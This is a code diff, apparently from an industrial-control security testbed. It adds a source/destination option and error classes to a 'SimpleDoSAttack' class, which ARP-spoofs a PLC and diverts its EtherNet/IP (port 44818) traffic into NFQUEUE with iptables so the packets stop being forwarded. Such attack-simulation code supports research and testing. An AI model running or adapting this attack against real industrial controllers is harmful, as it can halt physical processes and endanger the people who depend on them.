@@ -16,6 +16,14 @@ sniffed_packet = []
 nfqueue = NetfilterQueue()
 
 
+class Error(Exception):
+    """Base class for exceptions in this module."""
+
+
+class DirectionError(Error):
+    """Raised when the optional parameter direction does not have source or destination as value"""
+
+
 class SimpleDoSAttack(SyncedAttack):
     """
     This is a simple DoS attack. This attack will launch an ARP spoofing attack and then stop forwarding CIP packets
@@ -35,7 +43,14 @@ class SimpleDoSAttack(SyncedAttack):
 
     def setup(self):
 
-        os.system( f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE')
+        if self.direction == 'source':
+            os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE')
+        elif self.direction == 'destination':
+            os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE')
+        else:
+            self.logger.error('Wrong direction configured, direction must be source or destination')
+            raise DirectionError('Wrong direction configured')
+
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
@@ -70,8 +85,14 @@ class SimpleDoSAttack(SyncedAttack):
         self.logger.info(f"Stop ARP Poison between  {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} '
-                  f'-j NFQUEUE')
+        if self.direction == 'source':
+            os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE')
+        elif self.direction == 'destination':
+            os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE')
+        else:
+            self.logger.error('Wrong direction configured, direction must be source or destination')
+            raise DirectionError('Wrong direction configured')
+
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
